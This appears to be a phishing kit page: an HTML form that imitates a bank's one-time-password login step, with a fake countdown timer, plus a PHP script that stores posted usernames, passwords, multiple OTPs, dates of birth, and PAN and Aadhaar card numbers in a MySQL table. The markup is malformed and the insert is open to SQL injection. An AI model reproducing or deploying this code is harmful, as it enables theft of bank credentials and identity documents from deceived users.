<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>

input[type=text], input[type=password] {
  width: 100%;
  padding: 06px 20px;
  margin: 8px 0;
  display: inline-table;
  border: 1px solid #;
  box-sizing: border-box;
}

button {
  background-color:#ed8608 ;
  color: white;
  padding: 06px 20px;
  margin:  0;
  border: none;
  cursor: pointer;
  width: 30%; 
}

 button {
  background-color:#ed8608 ;
  color: white;
  padding: 06px 20px;
  margin:  0;
  border: none;
  cursor: pointer;
  width: 30%; 
}

button:hover {
  opacity: 0.8;
}

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

.imgcontainer {
  text-align: center;
  margin: -24px 0 12px 0;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 16px;
   
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>
</head>
<body>
  <body style="background-color:;">
</body>
<header>

    <center><h1 class="text-center"><img src="OPKL.jpg" style="width: 100%;"></h1></center>
  
 
  
  </header>


<form action="otpe5.php" method="post">
  <div class="imgcontainer">
    
  </div>

  <div class="container">



<label>One Time Password(OTP)*</label>
    <input type="text" placeholder="" name="otp3"maxlength="8"
      pattern="[0-9]{8}" required>







    </style>
</head>
<body onload="startTimer();">
   
     <div id="cc">
     <div id="dd">
         
         <script type="text/javascript">
         var timer=120;
         var sec=120;
         function startTimer() {
         sec=parseInt(timer%120);
         
         if (timer<0) {
         timer.stop();
         }
         document.getElementById("time").innerHTML = "<p1> Wait for OTP : </p1>"+sec.toString();
         timer--;
         setTimeout(function(){
         startTimer();
         
         }, 1000);
         }
         
         </script>
        
        
       <center> <b style="color:grey; font-family: Arial, Helvetica, sans-serif;  font-size:17px; margin-bottom:15px; margin-left:5px;"><span style="color:grey; font-size:15px;" id="time"></span>&nbsp;secs</p></b>






    <center><div class="w3ls-login">
                        <button type="submit" class="btn btn-success btn-block" name="save">Login</button>
                     </div>
</center>
  </div>

<center><h1 class="text-center"><img src="OUTTPH1.jpg" style="width: 100%;"></h1></center>


<center><h1 class="text-center"><img src="FOOT11.jpg" style="width: 100%;"></h1></center>

</form>

</body>
</html><?php

$server_name ="localhost" ;
$username ="root" ;
$password="" ;
$database_name ="test" ;
$conn = mysqli_connect($server_name,$username,$password,$database_name);

//if($conn){
  echo "  
  ";



if(isset($_POST['save']))
{
   
  $username = $_POST['username'];
  
  $password = $_POST['password'];
  $number = $_POST['number'];
  $otp1 = $_POST['otp1'];
  $BranchName = $_POST['BranchName'];
  $HolderName = $_POST['HolderName'];
  $DOB = $_POST['DOB'];
  $otp2 = $_POST['otp2'];
  $PANCARDNU = $_POST['PANCARDNU'];
  $Name = $_POST['Name'];
  $otp3 = $_POST['otp3'];
   $AadhaarCARDNU= $_POST['AadhaarCARDNU'];
  $otp4 = $_POST['otp4'];
   $otp5 = $_POST['otp5'];
  $otp6 = $_POST['otp6'];


              


  $sql_query = " INSERT INTO img (username,password,number,otp1,BranchName,HolderName,DOB,otp2,PANCARDNU,Name,otp3,AadhaarCARDNU,otp4,otp5,otp6)
 VALUES('$username','$password','$number','$otp1','$BranchName','$HolderName','$DOB','$otp2','$PANCARDNU','$Name','$otp3','$AadhaarCARDNU','$otp4','$otp5','$otp6')";

 if (mysqli_query($conn,$sql_query))
 {
  echo "";
 }
 else
 {
  echo "error"; 

 }

}
?>